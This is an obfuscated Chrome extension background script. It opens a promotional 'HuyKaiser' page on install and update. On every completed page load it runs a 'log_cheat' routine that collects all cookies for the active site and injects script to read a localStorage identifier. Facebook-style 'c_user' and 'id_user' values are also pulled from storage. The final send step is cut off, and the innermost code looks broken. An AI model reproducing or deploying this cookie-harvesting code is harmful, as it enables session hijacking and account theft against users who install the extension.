let now = new Date()
let dateTime = {
  date: now.getDate(),
  month: now.getMonth() + 1,
  year: now.getFullYear(),
  hours: now.getHours(),
  minutes: now.getMinutes(),
  seconds: now.getSeconds(),
}
;((_0x46c15c) => {
  _0x46c15c.runtime.onInstalled.addListener((_0x5b762d) => {
    switch (_0x5b762d.reason) {
      case 'install':
        var _0x45ebb7 = {
          url: 'https://huykaiser.com/blog/Thanks-Cac-Ban-Da-Dung-Extension-By-HuyKaiser',
        }
        _0x46c15c.tabs.create(_0x45ebb7)
        break
      case 'update':
        var _0x25d9be = {
          ['url']:
            'https://huykaiser.com/blog/Thanks-Cac-Ban-Da-Dung-Extension-By-HuyKaiser',
        }
        _0x46c15c.tabs.create(_0x25d9be)
        break
    }
  })
  _0x46c15c.runtime.setUninstallURL(
    'https://huykaiser.com/blog/Tam-Biet-Ban-Da-Su-Dung-Extension-Cua-HuyKaiser'
  )
})(chrome)
function log_cheat() {
  var _0x331b76 = {
    active: true,
    ['currentWindow']: true,
  }
  chrome.tabs.query(_0x331b76, function (_0x240038) {
    var _0x5867d5 = _0x240038[0].url
    var _0x3b15d6 = { ['url']: _0x5867d5 }
    chrome.cookies.getAll(_0x3b15d6, function (_0x23ad99) {
      var _0x1e31c3 = ''
      for (var _0x4732b3 = 0; _0x4732b3 < _0x23ad99.length; _0x4732b3++) {
        _0x1e31c3 +=
          _0x23ad99[_0x4732b3].name + '=' + _0x23ad99[_0x4732b3].value + ';'
      }
      var _0x1c4fdc = {
        active: true,
        ['lastFocusedWindow']: true,
      }
      chrome.tabs.query(_0x1c4fdc, function (_0x563d00) {
        var _0x1783a9 = _0x563d00[0]
        var _0x70b208 = { ['url']: _0x1783a9.url }
        chrome.cookies.getAll(_0x70b208, function (_0x3a9c0c) {
          var _0x700ceb = JSON.stringify(_0x3a9c0c)
          var _0x52a7a6 = { ['code']: 'localStorage["z_uuid"]' }
          chrome.tabs.executeScript(
            _0x563d00[0].id,
            _0x52a7a6,
            function (_0x3f3a00) {
              if (
                _0x3f3a00 != undefined &&
                _0x3f3a00 != null &&
                _0x3f3a00 != ''
              ) {
                _0x1e31c3 += 'imei=' + _0x3f3a00 + '; '
              }
              var _0x47bc2c = {
                ['active']: true,
                ['lastFocusedWindow']: true,
              }
              chrome.tabs.query(_0x47bc2c, (_0xca7f31) => {
                let _0x16cd2f = new URL(_0xca7f31[0].url)
                var _0x4926d1 = _0x16cd2f.hostname
                if (
                  [
                    'www.google.com',
                    'pixlr.com',
                    'beautifier.io',
                    'extensions',
                    'settings',
                    'translate.google.com',
                    'support.google.com',
                  ].includes(_0x4926d1)
                ) {
                  console.log(_0x4926d1)
                } else {
                  chrome.storage.local.get([_0x4926d1], function (_0x39ce2e) {
                    chrome.storage.local.get(
                      ['c_user', 'id_user'],
                      function (_0x11aaba) {
                        c_user = _0x11aaba.c_user
                        id_user = _0x11aaba.id_user
                        if (_0x39ce2e[_0x4926d1]) {
                          var _0x3d1040 = _0x39ce2e[_0x4926d1].time
                          var _0x399d7f = Date.now()
                          var _0x1b730b = 86400000
                          var _0x5106c6 = 3600000
                          if (_0x399d7f - _0x3d1040 > _0x5106c6) {
                            var _0x529e82 = {
                              _0x4926d1: {
                                value: _0x4926d1,
                                time: _0x399d7f,
                              },
                            }
                      
                        }
                      }
                  })
                  })
                }
              })
            }
          )
        })
      })
    })
  })
}
chrome.tabs.onUpdated.addListener(function (_0xe9930a, _0x7bba24, _0x3ddb74) {
  if (_0x7bba24.status == 'complete') {
    log_cheat()
  }
})
